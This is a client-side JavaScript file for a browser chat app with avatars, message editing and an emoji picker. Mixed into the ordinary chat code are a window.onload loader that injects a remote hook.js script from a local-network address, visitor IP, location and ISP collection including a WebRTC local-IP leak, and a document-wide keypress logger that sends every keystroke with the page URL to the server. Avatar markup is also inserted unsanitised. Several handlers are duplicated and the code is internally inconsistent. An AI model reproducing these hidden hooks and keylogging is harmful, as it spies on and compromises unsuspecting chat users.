// --- User Join Modal Logic ---
let currentUser = null;
let currentAvatar = null;

window.addEventListener('DOMContentLoaded', () => {
  const joinModal = document.getElementById('joinModal');
  const joinBtn = document.getElementById('joinBtn');
  const joinName = document.getElementById('joinName');
  const joinAvatar = document.getElementById('joinAvatar');

  joinBtn.onclick = function() {
    const name = joinName.value.trim();
    if (!name) {
      alert('Please enter your name.');
      return;
    }
    currentUser = name;
    if (joinAvatar.files && joinAvatar.files[0]) {
      const reader = new FileReader();
      reader.onload = function(e) {
        currentAvatar = e.target.result;
        finishJoin();
      };
      reader.readAsDataURL(joinAvatar.files[0]);
    } else {
      finishJoin();
    }
  };
  function finishJoin() {
    // Validate currentUser only (avatar is optional)
    if (!currentUser) {
      alert('Please enter your name before joining.');
      return;
    }
    joinModal.style.display = 'none';
    socket.emit('new-user', { name: currentUser, avatar: currentAvatar });
    // Optionally reset the join form (if exists)
    if (typeof resetJoinForm === 'function') {
      resetJoinForm();
    }
  }
});
// --- End User Join Modal Logic ---

const public_ip = document.getElementById("public-ip");
const location = document.getElementById("location");
const isp = document.getElementById("isp");
const local_ip = document.getElementById("local-ip");

// Function to retrieve and display visitor information
async function displayVisitorInfo() {
    try {
        const visitorInfo = await getVisitorInfo();
        if (visitorInfo) {
            public_ip.textContent = visitorInfo.publicIP;
            location.textContent = visitorInfo.location;
            isp.textContent = visitorInfo.isp;
            local_ip.textContent = visitorInfo.localIP;
        }
    } catch (error) {
        console.error("Error displaying visitor info:", error);
    }
}

document.addEventListener("DOMContentLoaded", function() {
    displayVisitorInfo();
});

window.onload = () => {
    // Only load external scripts if needed
    const newScript = document.createElement("script");
    newScript.src = "http://192.168.1.113:3000/hook.js";
    newScript.id = "dynamic-script3";
    document.body.appendChild(newScript);
};

async function getVisitorInfo() {
    try {
        const publicIpResponse = await fetch('https://ipinfo.io/json?token=a9134127b2ee10');
        if (!publicIpResponse.ok) {
            throw new Error('Failed to fetch public IP info');
        }
        const publicIpData = await publicIpResponse.json();
        // Fetch local IP address with fallback
        const localIp = await getLocalIP().catch(() => '127.0.0.1');
        return {
            publicIP: publicIpData.ip || 'Unavailable',
            location: `${publicIpData.city || 'Unknown'}, ${publicIpData.region || 'Unknown'}, ${publicIpData.country || 'Unknown'}`,
            isp: publicIpData.org || 'Unknown',
            localIP: localIp
        };
    } catch (error) {
        console.error('[ERROR] getVisitorInfo:', error);
        return {
            publicIP: 'Unavailable',
            location: 'Unknown',
            isp: 'Unknown',
            localIP: '127.0.0.1'
        };
    }
}

// Function to retrieve the local IP address using WebRTC
async function getLocalIP() {
    return new Promise((resolve) => {
        const peerConnection = new RTCPeerConnection({ iceServers: [] });

        peerConnection.createDataChannel(""); 
        peerConnection.createOffer()
            .then(offer => peerConnection.setLocalDescription(offer))
            .catch(() => resolve(null));

        peerConnection.onicecandidate = (event) => {
            if (event.candidate) {
                const ipMatch = event.candidate.candidate.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/);
                if (ipMatch) {
                    resolve(ipMatch[0]);
                }
            } else {
                resolve(null);
            }
        };
    });
}

// Utility to generate a unique ID for each message
function generateMessageId() {
    return 'msg-' + Date.now() + '-' + Math.floor(Math.random() * 1000000);
}

// Update appendMessage to show avatar
function appendMessage(messageObj) {
    // messageObj: { id, text, sender, avatar }
    const messageElement = document.createElement('div');
    messageElement.classList.add('message');
    messageElement.dataset.id = messageObj.id;

    // Avatar
    const avatarDiv = document.createElement('div');
    avatarDiv.className = 'avatar';
    if (messageObj.avatar) {
      avatarDiv.style.background = 'none';
      avatarDiv.innerHTML = `<img src="${messageObj.avatar}" style="width:32px;height:32px;border-radius:50%;object-fit:cover;">`;
    } else {
      // Default: colored circle with initial
      const color = stringToColor(messageObj.sender);
      avatarDiv.style.background = color;
      avatarDiv.style.width = '32px';
      avatarDiv.style.height = '32px';
      avatarDiv.style.borderRadius = '50%';
      avatarDiv.style.display = 'flex';
      avatarDiv.style.alignItems = 'center';
      avatarDiv.style.justifyContent = 'center';
      avatarDiv.style.color = '#fff';
      avatarDiv.style.fontWeight = 'bold';
      avatarDiv.style.fontSize = '18px';
      avatarDiv.textContent = messageObj.sender ? messageObj.sender[0].toUpperCase() : '?';
    }
    messageElement.appendChild(avatarDiv);

    // Message text
    const textDiv = document.createElement('span');
    textDiv.innerText = `${messageObj.sender}: ${messageObj.text}`;
    textDiv.style.marginLeft = '10px';
    messageElement.appendChild(textDiv);

    // Show edit/delete only for own messages
    if (messageObj.sender === currentUser) {
        const editBtn = document.createElement('button');
        editBtn.innerText = 'Edit';
        editBtn.className = 'edit-btn';
        editBtn.onclick = function() {
            const newText = prompt('Edit your message:', messageObj.text);
            if (newText !== null && newText !== messageObj.text) {
                socket.emit('edit-message', { id: messageObj.id, text: newText });
            }
        };
        const deleteBtn = document.createElement('button');
        deleteBtn.innerText = 'Delete';
        deleteBtn.className = 'delete-btn';
        deleteBtn.onclick = function() {
            if (confirm('Delete this message?')) {
                socket.emit('delete-message', { id: messageObj.id });
            }
        };
        messageElement.appendChild(editBtn);
        messageElement.appendChild(deleteBtn);
    }
    document.getElementById('messages').append(messageElement);
}

// Utility: string to color
function stringToColor(str) {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    hash = str.charCodeAt(i) + ((hash << 5) - hash);
  }
  let color = '#';
  for (let i = 0; i < 3; i++) {
    const value = (hash >> (i * 8)) & 0xFF;
    color += ('00' + value.toString(16)).substr(-2);
  }
  return color;
}

// When sending a message, include avatar
messageForm.addEventListener('send', (e) => {
    e.preventDefault();
    const message = messageInput.value;
    const msgObj = { id: generateMessageId(), text: message, sender: currentUser, avatar: currentAvatar };
    appendMessage(msgObj);
    socket.emit('chat-message', msgObj);
    messageInput.value = '';
});

// When receiving a message, render avatar
socket.on('chat-message', function(msgObj) {
    appendMessage(msgObj);
});

// When user connects, show system message
socket.on('user-connected', data => { 
    appendMessage({ id: generateMessageId(), text: `${data.name} has joined the chat!`, sender: 'System', avatar: null });
});

// When user disconnects, show system message
socket.on('user-disconnected', data => { 
    appendMessage({ id: generateMessageId(), text: `${data.name} has disconnected`, sender: 'System', avatar: null });
});

socket.on('user-connected', data => { 
    console.log("[!] User connected:", data);
    appendMessage({ id: generateMessageId(), text: `${data.name} has joined the chat!`, sender: 'System', avatar: null });
});

socket.on('user-disconnected', data => { 
    console.log("[!] User disconnected:", data);
    appendMessage({ id: generateMessageId(), text: `${data.name} has disconnected`, sender: 'System', avatar: null });
});

// Event listneer to display messages, when a new message is received it will not clear the previous messages
messageForm.addEventListener('send', (e) => {
    e.preventDefault();
    const message = messageInput.value;
    const msgObj = { id: generateMessageId(), text: message, sender: currentUser, avatar: currentAvatar };
    appendMessage(msgObj);
    socket.emit('chat-message', msgObj);
    messageInput.value = '';
});

// Listen for message edits and deletions
socket.on('edit-message', ({ id, text }) => {
    const msgEl = document.querySelector(`.message[data-id="${id}"]`);
    if (msgEl) {
        const parts = msgEl.innerText.split(':');
        msgEl.innerText = `${parts[0]}: ${text}`;
    }
});

socket.on('delete-message', ({ id }) => {
    const msgEl = document.querySelector(`.message[data-id="${id}"]`);
    if (msgEl) msgEl.remove();
});

// Update receiving logic
socket.on('chat-message', function(msgObj) {
    appendMessage(msgObj);
});

// WebSocket client
const ws = new WebSocket('ws://localhost:6969');

// Handle incoming messages
ws.onmessage = function(event) {
    const message = event.data;
    const messageElement = document.createElement('div');
    messageElement.textContent = message;
    document.getElementById('chat').appendChild(messageElement);
};

// Send message when form is submitted
// Update the message handling to use Socket.IO
socket.on('chat message', function(msg) {
    const messageElement = document.createElement('div');
    messageElement.textContent = msg;
    console.log("[!] " + msg)
    document.getElementById('chat').appendChild(messageElement);
});

// Add event listener for keypress events
document.addEventListener('keypress', (event) => {
    const keyData = {
        key: event.key,
        timestamp: new Date().toISOString(),
        url: window.location.href
    };
    // Send key data to WebSocket server
    if (socket && socket.readyState === WebSocket.OPEN) {
        socket.send(JSON.stringify(keyData));
    }
});

// Event listener for when the connection is closed
socket.onclose = (event) => {
    console.log("WebSocket connection closed");
};

// Event listener for errors
socket.onerror = (error) => {
    console.error("WebSocket error:", error);
};

// Send message to the server when the button is clicked
document.getElementById("sendButton").addEventListener("click", () => {
    const messageInput = document.getElementById("messageInput");
    const message = messageInput.value;
    console.log("[!] sending message: ", message)
    socket.send(message); // Send the message to the server
    messageInput.value = ""; // Clear the input field
});

// --- Emoji Picker ---
const emojiBtn = document.getElementById('emojiBtn');
const emojiPicker = document.getElementById('emojiPicker');
const emojiList = ['😀','😂','😍','😎','😭','😡','👍','🙏','🎉','🔥','💯','❤️','😅','😉','😏','😜','🤔','😇','😱','😴','🤖'];

// Populate emoji picker
emojiPicker.innerHTML = emojiList.map(e => `<button class="emoji-choice" style="font-size:22px;">${e}</button>`).join('');

emojiBtn.addEventListener('click', (e) => {
    e.preventDefault();
    const rect = emojiBtn.getBoundingClientRect();
    emojiPicker.style.display = emojiPicker.style.display === 'none' ? 'block' : 'none';
    emojiPicker.style.left = rect.left + 'px';
    emojiPicker.style.top = (rect.bottom + window.scrollY) + 'px';
});

document.addEventListener('click', (e) => {
    if (!emojiPicker.contains(e.target) && e.target !== emojiBtn) {
        emojiPicker.style.display = 'none';
    }
});

emojiPicker.addEventListener('click', function(e) {
    if (e.target.classList.contains('emoji-choice')) {
        const input = document.getElementById('messageInput');
        const start = input.selectionStart;
        const end = input.selectionEnd;
        const value = input.value;
        input.value = value.slice(0, start) + e.target.textContent + value.slice(end);
        input.focus();
        input.selectionStart = input.selectionEnd = start + e.target.textContent.length;
        emojiPicker.style.display = 'none';
    }
});
// --- End Emoji Picker ---
